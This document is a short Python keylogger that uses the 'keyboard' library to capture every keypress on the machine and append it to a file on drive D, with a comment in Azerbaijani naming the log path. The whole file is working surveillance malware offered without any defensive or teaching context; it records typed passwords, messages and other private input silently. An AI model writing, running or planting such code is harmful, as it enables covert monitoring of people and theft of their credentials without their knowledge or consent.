import keyboard
def on_press(k):
    with open("D:\\keylog.txt", "a") as file: #Log faylinin yolu
        if k.name in ["space", "capslock",
                      "ctrl", "enter",
                      'delete','aback',
                      'pause','shift','tab']:
            file.write('\n|{}|'.format(k.name))
        elif k.name == 'backspace':
            file.write('\n <--|')
        else:
            file.write(k.name)
    
keyboard.on_press(on_press)
keyboard.wait()
